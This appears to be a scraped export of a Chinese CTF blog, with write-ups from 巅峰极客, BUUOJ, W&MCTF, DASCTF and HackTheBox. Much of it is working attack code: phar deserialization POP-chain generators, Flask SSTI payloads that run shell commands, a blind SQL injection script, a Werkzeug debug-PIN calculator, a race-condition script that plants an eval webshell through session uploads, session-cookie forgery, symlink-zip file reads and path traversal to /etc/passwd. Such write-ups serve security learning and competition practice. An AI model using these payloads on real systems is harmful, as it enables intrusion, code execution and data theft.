我们起先看到的是第117行的file_exists，我们在这里尝试了一番之后发现这里并不能触发phar反序列化。\n原因是file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])进行了拼接，phar://是传不进去的，那么剩下的唯一能触发的地方只有第153和156行的file_get_contents了。\n而实际上能触发的只有153行的file_get_contents，156行的是给你读flag的。\n构造pop链 全局搜索魔术方法；\n155行Reader::__set\npublic function __set($name,$val){\recho file_get_contents($val);\r}\r31行User::__toString\npublic function __toString()\r{\r$this-\u003enickname-\u003ebackup=$this-\u003ebackup;\r$user = new User();\r$user-\u003eid = $_SESSION['id'];\r$user-\u003enickname = $_SESSION['token'];\rreturn serialize($user);\r}\r81行dbCtrl::__destruct\npublic function __destruct(){\recho $this-\u003etoken;\r}\rpop链很明确：\n//pop链\r$pop = new dbCtrl();\r$pop-\u003etoken = new User();\r$pop-\u003etoken-\u003enickname = new Reader();\r$pop-\u003etoken-\u003ebackup = '/flag';\r//构造phar文件\r@unlink(\"phar.phar\");\r$phar = new Phar(\"phar.phar\");\r$phar-\u003estartBuffering();\r$phar-\u003esetStub(\"GIF89a\".\"\u003c?php __HALT_COMPILER(); ?\u003e\");\r$phar-\u003esetMetadata($pop);\r$phar-\u003eaddFromString(\"test.jpg\", \"test\");\r$phar-\u003estopBuffering();\r运行得到一个phar.phar，改后缀（ph被waf了），上传。\n在read.php里面传入compress.zlib://phar:///var/www/html/upload/xxx获得flag\nbabyflask 考点：常规SSTI和沙盒逃逸\n题目挺友好的，没有任何过滤，随便找个payload就可以打出来；\n?name={{().__class__.__bases__.__getitem__(0).__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}\rbabyback 考点：sqli单引号逃逸、bool盲注、\n进去一个登录框；\nfuzz一波之后发现ban掉了单双引号，自然想到了\\造成的单引号逃逸。\nsqli盲注 username=\\\u0026password=||1#\r//提示密码错误，正常的应该是用户名或密码错误\r然后还发现ban了select，我拼命地想去绕，卡了很久，结果根本不用注表名列名，只需要得到管理员密码就行了（在robots.txt也有提示）\nusername=\\\u0026password=||ascii(substr(password,1,1))\u003e1#\r这里是盲注的exp：\n#python3\r#wh1sper\rimport requests\rhost = 'http://eci-2zebr3la2yjigbu8w27y.cloudeci1.ichunqiu.com/index.php'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = 'database()'#--p3rh4ps\rbabyselect = 'password'#--uAreRigHt\rdata = {\r\"username\": \"\\\\\",\r\"password\": \"||ascii(substr({},{},1))\u003e{}#\".format(babyselect, j, mid(bot, top))\r}\rr = requests.post(url=host, data=data)\r#print(r.text)\r#print(data)\rif '\u003e密码错误\u003c' in r.text:\rif top - 1 == bot:\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top)\relse:\rif top - 1 == bot:\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top)\rif __name__ == '__main__':\rsqli()\r登录，来到第二关；\n是一个eval函数，\neval($command.\"=false\");\rwaf很强，可以用取反直接include根目录的flag：\ncommand=?\u003e\u003c?=include~%D0%99%93%9E%98?\u003e\r","description":"","tags":["phar","compress.zlib"],"title":"2020“巅峰极客”","uri":"/posts/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"},{"categories":["ctf_writeup"],"content":"[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令\n要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给\n比赛的时候应该是给了源码：\n\u003c?php\rputenv('PATH=/home/rceservice/jail');\rif (isset($_REQUEST['cmd'])) {\r$json = $_REQUEST['cmd'];\rif (!is_string($json)) {\recho 'Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;';\r} elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) {\recho 'Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;';\r} else {\recho 'Attempting to run command:\u0026lt;br/\u0026gt;';\r$cmd = json_decode($json, true)['cmd'];\rif ($cmd !== NULL) {\rsystem($cmd);\r} else {\recho 'Invalid input';\r}\recho '\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;';\r}\r}\r?\u003e\r正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过\n然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。\nflag在PATH的上级目录。\n?cmd={%0A\"cmd\":\"/bin/cat /home/rceservice/flag\"%0A}\r[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码\nreferer：https://blog.csdn.net/Alexhcf/article/details/108400293\n从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密\n在base64解密的页面如果解密出现错误的话，会开启debug\n而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：\n那么我们可以沙箱逃逸试试，可以用jinja2中控制结构 {% %} ，也可以用变量取值 {{}}\n如果用控制结构：\n{% for c in [].__class__.__base__.__subclasses__() %} {% if 'catch_warnings' in c.__name__%} {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }} {% endif %}{% endfor %}\r改成一行：\n{% for c in [].__class__.__base__.__subclasses__() %}{% if 'catch_warnings' in c.__name__%}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}\r可以读取app.py的源码，当然也可读取根目录的flag\n如果用变量取值：\n{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}\r可以列根目录文件（这个解法是非预期，预期是pin）\n但是需要注意的是{{''.__class__.__bases__[0].__subclasses__()}}并不会有任何回显，需要subclasses__()[xx]慢慢找\n预期解是算pin码然后用debug来RCE；\n读取6个参数计算pin码 任意文件读取的payload是：\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}\r其中filename是文件名称\n通过PIN码生成机制可知，需要获取如下信息\n 服务器运行flask所登录的用户名。通过/etc/passwd中可以猜测为flaskweb 或者root，此处用的flaskweb modname。一般不变就是flask.app getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask，该值一般不变 flask库下app.py的绝对路径。报错信息会泄露该值。题中为/usr/local/lib/python3.7/site-packages/flask/app.py 当前网络的mac地址（十六进制）的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)，我开的BUU的docker为02:42:ae:01:2d:af ，转换后为2485410376060 机器的id：对于非docker机每一个机器都会有自已唯一的id Linux：/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件 Windows docker：/proc/self/cgroup  获取了6个值之后，可以利用exp计算pin码\nimport hashlib\rfrom itertools import chain\rprobably_public_bits = [\r'flaskweb', # 服务器运行flask所登录的用户名\r'flask.app', # modname\r'Flask', # getattr(app, \"\\_\\_name__\", app.\\_\\_class__.\\_\\_name__)\r'/usr/local/lib/python3.7/site-packages/flask/app.py', # flask库下app.py的绝对路径\r]\rprivate_bits = [\r'2485410409903', # 当前网络的mac地址的十进制数\r'0a1d70fa2590282a8abb5e96d8f175b147dd2477459d97c179af421feb9260cd' # 机器的id\r]\rh = hashlib.md5()\rfor bit in chain(probably_public_bits, private_bits):\rif not bit:\rcontinue\rif isinstance(bit, str):\rbit = bit.encode('utf-8')\rh.update(bit)\rh.update(b'cookiesalt')\rcookie_name = '__wzd' + h.hexdigest()[:20]\rnum = None\rif num is None:\rh.update(b'pinsalt')\rnum = ('%09d' % int(h.hexdigest(), 16))[:9]\rrv = None\rif rv is None:\rfor group_size in 5, 4, 3:\rif len(num) % group_size == 0:\rrv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\rfor x in range(0, len(num), group_size))\rbreak\relse:\rrv = num\rprint(rv)\r运行得到131-679-327，在debug输入然后RCE\n[MRCTF2020]Ezaudit 考点：PHP伪随机数，sql注入\n要先扫目录，可以扫到login.php和www.zip，源码：\n\u003c?php\rheader('Content-type:text/html; charset=utf-8');\rerror_reporting(0);\rif(isset($_POST['login'])){\r$username = $_POST['username'];\r$password = $_POST['password'];\r$Private_key = $_POST['Private_key'];\rif (($username == '') || ($password == '') ||($Private_key == '')) {\r// 若为空,视为未填写,提示错误,并3秒后返回登录界面\rheader('refresh:2; url=login.html');\recho \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";\rexit;\r}\relse if($Private_key != '*************' )\r{\rheader('refresh:2; url=login.html');\recho \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";\rexit;\r}\relse{\rif($Private_key === '************'){\r$getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';';\r$link=mysql_connect(\"localhost\",\"root\",\"root\");\rmysql_select_db(\"test\",$link);\r$result = mysql_query($getuser);\rwhile($row=mysql_fetch_assoc($result)){\recho \"\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\".$row[\"username\"].\"\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\".$row[\"flag\"].\"\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\";\r}\r}\r}\r}\r// genarate public_key\rfunction public_key($length = 16) {\r$strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\r$public_key = '';\rfor ( $i = 0; $i \u0026lt; $length; $i++ )\r$public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\rreturn $public_key;\r}\r//genarate private_key\rfunction private_key($length = 12) {\r$strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\r$private_key = '';\rfor ( $i = 0; $i \u0026lt; $length; $i++ )\r$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\rreturn $private_key;\r}\r$Public_key = public_key();\r//$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key???\r其实就是两道题焊接起来，用GWCTF的exp可以直接打：\n#!/usr/bin/env python\rstr1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\rstr2='KVQP0LdJKRaV3n9D'\rstr3 = str1[::-1]\rlength = len(str2)\rres=''\rfor i in range(len(str2)):\rfor j in range(len(str1)):\rif str2[i] == str1[j]:\rres+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\rbreak\rprint res\r得到：\n36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61\r拿去php_mt_seed跑，得到种子1775196155，然后去算私钥，注意要先把公钥算一遍再算私钥；\n算出来之后sqli直接万能密码登录；\nflag{a0b16377-22ae-4b81-b054-2afb7a5e6e6b\n[SWPU2019]Web3 考点：flask session伪造、命令注入、CVE-2018-12015、/proc/self/cwd、/proc/self/environ\n\u003e\u003e[Linux下/proc/pid]/*的作用\n输入用户名登录，页面会显示“Hello wh1sper”，尝试{{}}没有探测到注入。\n登陆之后有个/upload路由，但是提示没有权限，估计是要进行cookie伪造\n转而把注意力放在了cookie上面。\nsession伪造 利用flask-session-cookie-manager-master进行解码：\npython .\\flask_session_cookie_manager3.py decode -c \".eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ\"\rb'{\"id\":{\" b\":\"MTAw\"},\"is_login\":true,\"password\":\"wh1sper\",\"username\":\"wh1sper\"}'\r如果访问不存在的路由会给一个响应头：\nSwpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== base64解码之后就是secret_key(这里没搞懂为什么要这样出):\nSECRET_KEY:keyqqqwwweee!@#$%^\u0026* 再次进行解码：\npython .\\flask_session_cookie_manager3.py decode -c \".eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ\" -s \"keyqqqwwweee!@#$%^\u0026*\"\r{'id': b'100', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}\r盲猜如果id=1的话应该就可以越权，那么再次加密回去；\npython .\\flask_session_cookie_manager3.py encode -s \"keyqqqwwweee!@#$%^\u0026*\" -t \"{'id': '1', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}\"\r.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmXZxgWF6QWARWVFqcW5SXmpiIJ1gIA95wWug.X3vb0w.5S11T85EsOVa2ggJa_vbtgJDxr4\rF12替换cookie，来到/upload路由；\nctrl+U能够查看到后端源码：\n@app.route('/upload', methods=['GET', 'POST'])\rdef upload():\rif session['id'] != b'1':\rreturn render_template_string(temp)\rif request.method == 'POST':\rm = hashlib.md5()\rname = session['password']\rname = name + 'qweqweqwe'\rname = name.encode(encoding='utf-8')\rm.update(name)\rmd5_one = m.hexdigest()\rn = hashlib.md5()\rip = request.remote_addr\rip = ip.encode(encoding='utf-8')\rn.update(ip)\rmd5_ip = n.hexdigest()\rf = request.files['file']\rbasepath = os.path.dirname(os.path.realpath(__file__))\rpath = basepath + '/upload/' + md5_ip + '/' + md5_one + '/' + session['username'] + \"/\"\rpath_base = basepath + '/upload/' + md5_ip + '/'\rfilename = f.filename\rpathname = path + filename\rif \"zip\" != filename.split('.')[-1]:\rreturn 'zip only allowed'\rif not os.path.exists(path_base):\rtry:\ros.makedirs(path_base)\rexcept Exception as e:\rreturn 'error'\rif not os.path.exists(path):\rtry:\ros.makedirs(path)\rexcept Exception as e:\rreturn 'error'\rif not os.path.exists(pathname):\rtry:\rf.save(pathname)\rexcept Exception as e:\rreturn 'error'\rtry:\rcmd = \"unzip -n -d \" + path + \" \" + pathname\rif cmd.find('|') != -1 or cmd.find(';') != -1:\rwaf()\rreturn 'error'\ros.system(cmd)\rexcept Exception as e:\rreturn 'error'\runzip_file = zipfile.ZipFile(pathname, 'r')\runzip_filename = unzip_file.namelist()[0]\rif session['is_login'] != True:\rreturn 'not login'\rtry:\rif unzip_filename.find('/') != -1:\rshutil.rmtree(path_base)\ros.mkdir(path_base)\rreturn 'error'\rimage = open(path + unzip_filename, \"rb\").read()\rresp = make_response(image)\rresp.headers['Content-Type'] = 'image/png'\rreturn resp\rexcept Exception as e:\rshutil.rmtree(path_base)\ros.mkdir(path_base)\rreturn 'error'\rreturn render_template('upload.html')\r@app.route('/showflag')\rdef showflag():\rif True == False:\rimage = open(os.path.join('./flag/flag.jpg'), \"rb\").read()\rresp = make_response(image)\rresp.headers['Content-Type'] = 'image/png'\rreturn resp\relse:\rreturn \"can't give you\"\r利用软连接获取flag：CVE-2018-12015 Perl是美国程序员拉里-沃尔（Larry Wall）所研发的一种免费且功能强大的跨平台编程语言。Archive：：Tar module是其中的一个用于处理tar文件的模块。 Perl 5.26.2及之前版本中的Archive：：Tar模块存在安全漏洞。攻击者可借助带有相同名称的符号链接和常规文件的归档文件利用该漏洞绕过目录遍历保护机制并覆盖任意文件。\n以正常逻辑来看，源码的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。但是我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。同时结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的 flag 目录下。那么我们只要创建一个到/xxx/flask/flag/flag.jpg的软链接，即可读取 flag.jpg 文件。\n在 linux 中，/proc/self/cwd/会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg\n命令：\nln -s /proc/self/cwd/flag/flag.jpg qwe\rzip -ry qwe.zip qwe\rrepeater手动上传获得flag\n另外一种方法是获取flask运行的绝对路径，在 linux 中，/proc/self/environ文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到/proc/self/environ的内容，只需要下载到本地，用 notepad++打开即可)\nln -s /proc/self/environ qqq\rzip -ry qqq.zip qqq\rln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www\rzip -ry [www.zip](http://www.zip) www\r利用命令注入获取flag 另一种方法是通过命令注入来外带flag，我试了试本地是可以的\nVPS上面监听是可以收到的：\n但是在BUU复现的时候，我开了内网靶机却没有外带成功，不知道是什么原因，那就不搞他了。\n不得不说利用文件名进行命令注入的思路是很秒的\n[CSAWQual 2019]Web_Unagi 考点：XXE、编码绕过、外带数据\n打开题目有一个上传界面，叫我们上传一个用户，并且here给了一个例子：\n\u003c?xml version='1.0'?\u003e\r\u003cusers\u003e\r\u003cuser\u003e\r\u003cusername\u003ealice\u003c/username\u003e\r\u003cpassword\u003epasswd1\u003c/password\u003e\r\u003cname\u003eAlice\u003c/name\u003e\r\u003cemail\u003ealice@fakesite.com\u003c/email\u003e \u003cgroup\u003eCSAW2019\u003c/group\u003e\r\u003c/user\u003e\r\u003cuser\u003e\r\u003cusername\u003ebob\u003c/username\u003e\r\u003cpassword\u003epasswd2\u003c/password\u003e\r\u003cname\u003e Bob\u003c/name\u003e\r\u003cemail\u003ebob@fakesite.com\u003c/email\u003e \u003cgroup\u003eCSAW2019\u003c/group\u003e\r\u003c/user\u003e\r\u003c/users\u003e\r意思就是让我们上传一个XMl文件，由此我们想到了XXE漏洞。\n但是我们在构造外部实体的时候，页面返回\"WAF blocked uploaded file. Please try again\"。可能是某些词语被waf了，既然有waf我们就要fuzz。\n当我们在外部实体里面去掉\u003c!ENTITY dy SYSTEM \"file:///flag\"\u003e 的时候，页面回显正常了，我们再来一个个测关键词。\n一番fuzz之后，发现过滤了 SYSTEM、file、ENTITY等关键词。\n常规的XXE绕过其中一种方法是利用除UTF-8的编码绕过。\n利用Linux的命令可以把文件转换为UTF-16的格式，此时我们上传发现没有出现WAF的信息。\n只需要在标签里面引用实体就行了，但是我们发现flag只显示出来了一半。\n回显不出来就要外带数据，可以利用XML的报错信息，也可呀利用盲打的姿势外带。\n我本来想外带VPS的，结过URL填错了直接一个报错出来了。。。\n[CISCN2019 华北赛区 Day1 Web1]Dropbox 考点：任意文件操作、phar反序列化\n任意文件下载 先是注册登录，然后发现有文件上传功能，上传之后只有一个下载和删除的按钮，联想到任意文件下载。\n抓包，果不其然：\n挨个下载web路径文件，在class.php里面发现很多的类，联想到反序列化，然而并没有直接发现unserialize的操作。\n结合文件上传，思路过渡到phar反序列化。\nphar反序列化 根据phar反序列化的触发函数：\n触发点在class.php124行的file_exists函数。\n在download.php里面ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");限制了目录，当你反序列化发生在这个页面的时候是不能读取根目录的，能触发但是读不了/flag.txt。\n所以正确的触发点应该是delete.php的17行，调用$file-\u003eopen，file_exists触发，delete.php里面并没有限制目录所以可以任意文件读。\nPOP链 User::__destruct:\npublic function __destruct() {\r$this-\u003edb-\u003eclose();\r}\r可以利用同名方法：\nFile::close：\npublic function close() {\rreturn file_get_contents($this-\u003efilename);\r}\rFileList::__call:\npublic function __call($func, $args) {\rarray_push($this-\u003efuncs, $func);\rforeach ($this-\u003efiles as $file) {\r$this-\u003eresults[$file-\u003ename()][$func] = $file-\u003e$func();\r}\rexp:\n\u003c?php\rclass User {\rpublic $db;\r}\rclass File {\rpublic $filename;\r}\rclass FileList {\rprivate $files;\rprivate $results;\rprivate $funcs;\rpublic function __construct() {\r$file = new File();\r$file-\u003efilename = '/flag.txt';\r$this-\u003efiles = array($file);\r$this-\u003eresults = array();\r$this-\u003efuncs = array();\r}\r}\r@unlink(\"phar.phar\");\r$phar = new Phar(\"a.phar\");\r$phar-\u003estartBuffering();\r$phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\");\r$o = new User();\r$o-\u003edb = new FileList();\r$phar-\u003esetMetadata($o);\r$phar-\u003eaddFromString(\"test.txt\", \"test\");\r$phar-\u003estopBuffering();\r生成phar文件之后，抓包改MIME，在delete.php使用phar://文件名触发，读取flag。\n","description":"","tags":["RCE bypass","flask","XXE","伪随机数","CVE"],"title":"BUUOJ刷题记录(3)","uri":"/posts/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"},{"categories":["ctf_writeup"],"content":"前言 从第一次考核到第二次考核，明显感觉自己实力提升了一个层次，不过以后要走的路要踩的坑还很多。\n这次题目很给力，一共九道，难的简单的都有，幸苦@jylsec和@byc_404学长给我们搭建平台和出题目\n对CTF的套路还是不过熟悉，或者说思路还是不够灵敏，导致有些题目卡了很久没拿到一血，这里也膜一下Leon师傅（真的打不过）\n纪念 想看wp？怎么可能有wp，这辈子都不可能有wp。上一张纪念图，纪念我和leon师傅纠缠不清的爱情。\n其他的师傅也要多多加油嗷~~\n","description":"X1cT34m入队考核","tags":null,"title":"2020 X1cT34m WEB方向最终考核","uri":"/posts/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/"},{"categories":["ctf_writeup"],"content":"0day大战，，，打不动，告辞\n web_checkin 考点：文件包含file协议\n\u003c?php\r//PHP 7.0.33 Apache/2.4.25\rerror_reporting(0);\r$sandbox = '/var/www/html/' . md5($_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rhighlight_file(__FILE__);\rif(isset($_GET['content'])) {\r$content = $_GET['content'];\rif(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))\rdie('hacker');\rif(file_exists($content))\rrequire_once($content);\rfile_put_contents($content,'\u003c?php exit();'.$content);\r}\r直接file读取根目录flag\n?content=file:///flag\rWMCTF{a1sc8591as98c1a96s85c165as1cas7d89}\nMake PHP Great Again 考点：session.upload_progress文件包含，条件竞争\nreferer:https://www.freebuf.com/news/202819.html\nexp:\n#coding=utf-8\rimport io\rimport requests\rimport threading\rsessid = 'TGAO'\rdata = {\"cmd\":\"system('tac /var/www/html/flag.php');\"}\rdef write(session):\rwhile True:\rf = io.BytesIO(b'a' *100* 50)\rresp = session.post( 'http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com', data={'PHP_SESSION_UPLOAD_PROGRESS': '\u003c?php eval($_POST[\"cmd\"]);?\u003e'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\rdef read(session):\rwhile True:\rresp = session.post('http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com?file=/tmp/sess_'+sessid,data=data)\rif 'tgao.txt' in resp.text:\rprint(resp.text)\revent.clear()\relse:\rprint(\"[+++++++++++++]retry\")\rif __name__==\"__main__\":\revent=threading.Event()\rwith requests.session() as session:\rfor i in range(1,30):\rthreading.Thread(target=write,args=(session,)).start()\rfor i in range(1,30):\rthreading.Thread(target=read,args=(session,)).start()\revent.set()\rWMCTF{php_s0urc3_1s_om0sh1201}\n","description":"W\u0026M战队主板，0day大战","tags":["session.upload_progress","文件包含"],"title":"W\u0026MCTF2020","uri":"/posts/wmctf2020/"},{"categories":["ctf_writeup"],"content":"Ezfileinclude 考点：Unix时间戳、文件包含、目录穿越\n开局一张图，发现源码 image.php?t=1595664783\u0026f=Z3F5LmpwZw==\n访问之，回显：What's your time? 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；\n直接写脚本，目录穿越读取/flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  import time import requests import base64 t = int(time.time()) f = 'gqy.jpg?../../../../../../flag' f = base64.b64encode(f.encode()).decode() print(t, f) host = 'http://183.129.189.60:10009/image.php?t={}\u0026f={}'.format(t, f) head = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' } r = requests.get(url=host, headers=head) print(r.text)   SQLi 考点：无列名注入，sys.schema_tables_with_full_table_scans\n访问要求传入id参数：\nhttp://183.129.189.60:10004/?id=1;\r返回waf：\nreturn preg_match(\"/;|benchmark|\\^|if|[\\s]|in|case|when|sleep|auto|desc|stat|\\||lock|or|and|\u0026|like|-|`/i\", $id); stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats\nor意味着过滤了information_schema\n由waf想到了union注入：\n?id=0%27union/**/select/**/1,2,3%23\rArray ( [0] =\u003e 1 [id] =\u003e 1 [1] =\u003e 2 [username] =\u003e 2 [2] =\u003e 3 [password] =\u003e 3 )\r可以看到库名：\n?id=0%27union/**/select/**/1,database(),3%23\rsqlidb\r上述bypass infomation_schema的方法都被过滤了，不过leon师傅在一次开发当中发现了另一个库：sys.schema_tables_with_full_table_scans\n?id=0'/**/union/**/select/**/1,group_concat(object_name),3/**/from/**/sys.schema_tables_with_full_table_scans%23\r#users,flllaaaggg,sys_config\r接下来是无列名注入：\n?id=0'/**/union/**/select/**/1,(select/**/a.2/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flllaaaggg)a/**/limit/**/1,1),3%23\rflag{60325f20416b40b11b6049734bad11cf}\r","description":"","tags":["无列名"],"title":"DASCTF2020.7月赛","uri":"/posts/dasctf2020.7%E6%9C%88%E8%B5%9B/"},{"categories":["ctf_writeup"],"content":"Emdee five for life 考点：python正则，request模块\n打开页面，给你一个字符串，md5加密后提交，太慢或者错了就会Too slow：\n\u003chtml\u003e\r\u003chead\u003e\r\u003ctitle\u003eemdee five for life\u003c/title\u003e\r\u003c/head\u003e\r\u003cbody style=\"background-color:powderblue;\"\u003e\r\u003ch1 align='center'\u003eMD5 encrypt this string\u003c/h1\u003e\u003ch3 align='center'\u003eLWod6afkxEjJV8KZeLRO\u003c/h3\u003e\u003ccenter\u003e\u003cform action=\"\" method=\"post\"\u003e\r\u003cinput type=\"text\" name=\"hash\" placeholder=\"MD5\" align='center'\u003e\u003c/input\u003e\r\u003c/br\u003e\r\u003cinput type=\"submit\" value=\"Submit\"\u003e\u003c/input\u003e\r\u003c/form\u003e\u003c/center\u003e\r\u003c/body\u003e\r\u003c/html\u003e\r当然是脚本：\n#!/usr/bin/env python3\rimport requests\rimport re\rimport hashlib\rwhile 1:\rhost = \"http://docker.hackthebox.eu:32046/\"\rreq = requests.session()\rr = req.get(url=host)\r#print(r.text)\rpattern = re.compile(r\"\u003ch3 align='center'\u003e(\\S+)\u003c/h3\u003e\")\rh3 = pattern.findall(r.text)\rmd5 = hashlib.md5(h3[0].encode('utf-8')).hexdigest()\r#print(h3[0],md5)\rdata={'hash':md5}\rs = req.post(url=host, data=data)\rif 'Too slow!' in s.text:\rprint('Too slow!')\relse:\rprint(s.text)\rbreak\r第11行那里用了 (\\S+) 就会返回LWod6afkxEjJV8KZeLRO\n第二次POST过去的时候需要用session不然就会too slow\n FreeLancer 考点：sqli\n打开页面，有一个表单\n本来以为是XSS，但是无论怎么样提交都是500，后来看源码，发现了 \u003c!-- \u003ca href=\"portfolio.php?id=3\"\u003ePortfolio 3\u003c/a\u003e --\u003e\n访问发现sql注入，Union一把梭可以发现：\n表名：portfolio,safeadmin safeadmin列名：id,username,password,created_at\r注出来用户 safeamd 密码 $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K\n不过没什么用，因为我们目的是要getshell，其实也不用getshell，只要你用dirbuster爆破出这个文件 /var/www/html/administrat/panel.php 这个文件，直接读取他就好了\n","description":"","tags":["HackTheBox","正则"],"title":"HackTheBox_challenges","uri":"/posts/hackthebox_challenges/"},{"categories":["渗透"],"content":"信息搜集 扫一波端口：\nroot@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194\rStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDT\rNmap scan report for 10.10.10.194 (10.10.10.194)\rHost is up (0.27s latency).\rNot shown: 997 closed ports\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http\r8080/tcp open http-proxy\rNmap done: 1 IP address (1 host up) scanned in 639.04 seconds\rroot@wh1sper:~/tools/dirsearch#\r访问发现是个Tomcat的默认页面：\n访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：\n目录穿越+任意文件读取 在 file= 参数我们可以想到目录穿越漏洞，访问 http://10.10.10.194/news.php?file=../../../../etc/passwd 